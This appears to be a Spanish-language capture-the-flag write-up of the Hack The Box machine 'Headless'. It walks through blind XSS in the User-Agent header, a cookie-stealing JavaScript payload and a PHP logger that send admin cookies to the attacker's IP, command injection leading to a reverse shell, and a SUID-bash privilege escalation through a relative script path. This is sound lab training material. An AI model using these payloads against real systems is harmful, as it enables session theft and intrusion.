---
tags:
title: Headless - Easy (HTB)
permalink: /Headless-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmapf 10.129.222.91
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 12:24 -0500
<SNIP>
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.30 seconds
           Raw packets sent: 117604 (5.175MB) | Rcvd: 90183 (3.607MB)
-e [*] IP: 10.129.222.91
[*] Puertos abiertos: 22,5000
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,5000 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 12:24 -0500
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 12:24 (0:00:06 remaining)
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 12:24 (0:00:08 remaining)
Nmap scan report for 10.129.222.91
Host is up (0.46s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Under Construction
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.23 seconds
```
## Website

La pagina principal muestra un marcador de tiempo y un boton.

![image-center](/assets/images/Pasted image 20260209142521.png)
### XSS Blind

Dentro del mismo hay un formulario, con un campo `Message`, en el que se me ocurre meter un payload `XSS` para probar.

![image-center](/assets/images/Pasted image 20260209142549.png)

Intercepte la petición y la envié con `Burpsuite`, y al parecer el payload lo detecta.

![image-center](/assets/images/Pasted image 20260209143716.png)
### XSS in User-Agent Header

Sin embargo, probé el mismo payload en todas las cabeceras para ver su comportamiento, y es así como descubrí que el Header `User-Agent` era vulnerable.

![image-center](/assets/images/Pasted image 20260209144322.png)
## Shell as dvir

Ya que intente hacer que la web cargue un archivo externo desde mi `IP`. Y como se puede ver lo solicito

```bash
www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/headless]
allPorts  exploit.py  exp.py  ferox-http_headless_htb_5000_-1770658356.state  port_scan
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.222.91 - - [09/Feb/2026 12:38:22] code 404, message File not found
10.129.222.91 - - [09/Feb/2026 12:38:22] "GET /test.js HTTP/1.1" 404 -
10.129.222.91 - - [09/Feb/2026 12:41:30] code 404, message File not found
10.129.222.91 - - [09/Feb/2026 12:41:30] "GET /test.js HTTP/1.1" 404 -
```
### Grab admin cookie

Así que ahora como veo que los recursos los solicita, cree un archivo `.js` para hacer que cuando envié la solicitud, envie con esta el valor de las `cookies` del usuario que esta por detrás realizando la solicitud.

```bash
 cat cookie.js
document.location='http://10.10.17.19/index.php?c='+document.cookie;
```

El mismo va a cargar el archivo `php` donde al estar con mi servidor voy a poder ver el valor de las mismas.

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Volviendo a enviar el payload `XSS`, veo como desde mi servidor recibo el valor de las cookies.

```bash
www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[tun0] 10.10.17.19
<SNIP>
10.129.222.91 - - [09/Feb/2026 12:42:36] "GET /index.php?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
10.129.222.91 - - [09/Feb/2026 12:42:38] "GET /cookie.js HTTP/1.1" 304 -
10.129.222.91 - - [09/Feb/2026 12:42:39] "GET /index.php?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
```
### Command injection

El mismo lo reemplace en mi web, para poder acceder a la ruta `Dashboard` a la cual anteriormente no podía acceder

![image-center](/assets/images/Pasted image 20260209144409.png)

Luego de recargar la pagina, veo un nuevo panel.

![image-center](/assets/images/Pasted image 20260209144520.png)

Intercepte la solicitud nuevamente con `Burpsuite` y veo que en el parámetro `date`, se solicita una fecha, para poder generar un reporte del dia, devolviendo así el siguiente mensaje.

![image-center](/assets/images/Pasted image 20260209144625.png)
### Reverse shell

Intente luego usar `;` que es el separador de comandos en `Linux` y así poder inyectar comandos en el sistema, por ejemplo el comando `id`, y asi me devolvió que el usuario por detrás es `dvir`.

![image-center](/assets/images/Pasted image 20260209144644.png)

Así que me envié una shell a mi maquina.

![image-center](/assets/images/Pasted image 20260209144721.png)

Y desde mi listener `nc` recibo la conexión como este usuario.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.222.91] 34424
whoami
dvir
```

```bash
dvir@headless:~$ cat user.txt
37cf4b...
```
## Shell as root
### Sudo privileges

Viendo que privilegios `sudo` tengo con este usuario veo que puedo ejecutar `/usr/bin/syscheck` como el usuario `root`.

```bash
dvir@headless:~$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```
### Source code

Viendo el código del mismo, detecto que el mismo archivo luego de unas líneas, ejecutar el archivo `initdb.sh` desde la ruta actual desde la que se ejecutar el script `(syscheck)`.

```bash
dvir@headless:~$ cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```
### initdb.sh

Por lo que cree mi propio script malicioso el cual se encarga de asignarle el bit `SUID` a la bash.

```bash
dvir@headless:~$ cat initdb.sh
#!/bin/bash
chmod u+s /bin/bash
```

Le di permisos de ejecución y verifique los permisos de la shell.

```bash
dvir@headless:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 24  2023 /bin/bash
```
### Shell

Y luego lo ejecute, para después volver a verificar los permisos de la misma y vi que ahora es `SUID`.

```bash
dvir@headless:~$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.01, 0.03, 0.05
Database service is not running. Starting it...
dvir@headless:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 24  2023 /bin/bash
```

Por lo que usando `-p` me converti en `root`.

```bash
dvir@headless:~$ bash -p
bash-5.2# id
uid=1000(dvir) gid=1000(dvir) euid=0(root) groups=1000(dvir),100(users)
bash-5.2# whoami
root
```

```bash
bash-5.2# cat root.txt
9fad65...
```

`~Happy Hacking.`